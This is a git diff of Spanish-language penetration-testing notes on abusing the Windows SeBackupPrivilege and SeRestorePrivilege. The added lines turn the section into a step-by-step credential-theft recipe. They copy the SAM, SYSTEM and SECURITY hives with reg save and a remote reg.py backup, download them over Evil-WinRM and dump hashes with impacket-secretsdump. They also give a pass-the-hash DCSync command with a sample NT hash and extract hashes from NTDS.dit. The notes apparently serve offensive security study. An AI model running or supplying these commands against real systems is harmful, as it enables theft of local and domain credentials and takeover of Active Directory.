@@ -209,21 +209,47 @@ PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
 ```
 
 ```powershell 
-3. 'SeBackupPrivilege y SeRestorePrivilege' = Permite leer cualquier archivo del sistema, ignorando sus permisos NTFS. Se puede copiar archivos críticos del sistema como el 'SAM, SYSTEM o NTDS.dit', incluso si no tiene permisos NTFS explícitos para ello. Estos archivos contienen información sensible como: 'Hashes de contraseñas locales, Credenciales de cuentas del dominio (si es un DC) y Configuraciones de seguridad'
+3. 'SeBackupPrivilege y SeRestorePrivilege' = Son privilegios de Windows relacionados con las operaciones de Backup y Restore.
 
-# Forma de explotar 
-❯ https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/SeBackupPrivilege.md        
+## SeBackupPrivilege
+Permite realizar operaciones de backup sobre archivos y directorios aunque el usuario no tenga permisos NTFS de lectura normales sobre ellos.
+
+Esto puede permitir obtener copias de archivos protegidos del sistema como:
+
+- `SAM`
+- `SYSTEM`
+- `SECURITY`
+- `NTDS.dit` → En un Domain Controller
+
+Estos archivos pueden contener información sensible como:
+
+- Hashes de contraseñas locales
+- Hashes/credenciales de cuentas del dominio
+- Información relacionada con la configuración de seguridad
+
+
+## SeRestorePrivilege
+Permite realizar operaciones de restauración/escritura privilegiadas sobre archivos y directorios, pudiendo sobrepasar determinadas restricciones de permisos NTFS.
+
+A diferencia de `SeBackupPrivilege`:
+
+- `SeBackupPrivilege` → Principalmente relacionado con LECTURA/BACKUP
+- `SeRestorePrivilege` → Principalmente relacionado con ESCRITURA/RESTORE
+
+Para extracción de credenciales mediante archivos protegidos, el privilegio especialmente importante es:
+
+`SeBackupPrivilege`
 
 
 ++++++++++++++++++++++++++++++++++
 
-## FORMA 1
+## FORMA 1: Esta técnica permite obtener las hives del Registry para posteriormente extraer los hashes de las cuentas locales.
 Pasos:   
 ❯ reg save hklm\sam C:\Temp\sam.hive           # Hacer una copia de la SAM en Windows
 ❯ reg save hklm\system C:\Temp\system.hive     # Hacer una copia del system en Windows
 
 ❯ download sam.hive 
-# Descargar los archivos desde Evilwinrm a Kali 
+# Descargar los archivos desde Evil-WinRM a Kali
 
 ❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL   
 # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos  
@@ -231,7 +257,7 @@ Pasos:
 
 ++++++++++++++++++++++++++++++++++
 
-## FORMA 2
+## FORMA 2: Se puede utilizar una herramienta como `reg.py` para realizar un backup remoto de las hives del Registry.
 Pasos:
 # Descargar la tool 
 ❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    
@@ -244,11 +270,22 @@ Pasos:
 
 ❯ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL     # Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 
 
-❯ impacket-secretsdump 'domain1.corp/user'@IP_DC -hashes :64fbae31cc352fc26af97cbdef151e03 # Hacer un DCSync
+❯ impacket-secretsdump 'domain1.corp/Aadministrator'@IP_DC -hashes :64fbae31cc352fc26af97cbdef151e03 # Hacer un DCSync
 	# hashes = Hash ':NT' del usuario 
 
 Notas:
 	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
 	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
+
+++++++++++++++++++++++++++++++++++
+
+## FORMA 3: En un Domain Controller, NTDS.dit contiene la base de datos de Active Directory.
+Pasos:
+
+# Si se tiene el NTDS, SYSTEM, SECURITY se puede extraer de la siguiente forma. 
+❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL   
+❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 ```
+
+
 
